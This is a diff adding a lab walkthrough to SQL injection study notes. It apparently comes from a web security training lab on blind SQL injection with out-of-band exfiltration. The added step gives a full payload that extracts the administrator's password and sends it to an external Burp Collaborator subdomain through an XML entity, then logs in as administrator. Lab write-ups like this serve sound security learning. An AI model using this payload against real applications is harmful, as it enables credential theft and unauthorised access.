@@ -233,4 +233,12 @@ Theory:-  Error-based SQL injection refers to cases where you're able to use err
 
 ------------------------------------------------------------------------------------------------------------------------------------------
 
-#14 Lab: 
+#14 Lab: Blind SQL injection with out-of-band data exfiltration
+
+      1. Intercept the request and send to repeater
+      2. After tracking id append '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+      3. After polling in collaborator you will get the password of administrator in the subdomain
+      4. Login with that password and you are logged in as administrator
+
+-----------------------------------------------------------------------------------------------------
+
